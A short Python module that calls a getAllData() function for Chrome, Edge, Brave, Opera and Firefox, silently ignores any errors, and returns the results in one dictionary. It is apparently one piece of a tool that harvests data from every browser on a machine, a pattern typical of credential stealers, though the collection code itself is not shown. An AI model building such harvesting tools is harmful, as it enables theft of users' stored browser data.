import browsers.chrome
import browsers.edge
import browsers.brave
import browsers.opera
import browsers.firefox

def getAllData():
    try:
        chrome = browsers.chrome.getAllData()
    except:
        chrome = []

    try:
        edge = browsers.edge.getAllData()
    except:
        edge = []

    try:
        brave = browsers.brave.getAllData()
    except:
        brave = []

    try:
        opera = browsers.opera.getAllData()
        
    except:
        opera = []

    try:
        firefox = browsers.firefox.getAllData()
    except:
        firefox = []

    return {
        "chrome": chrome,
        "edge": edge,
        "brave": brave,
        "opera": opera,
        "firefox": firefox
    }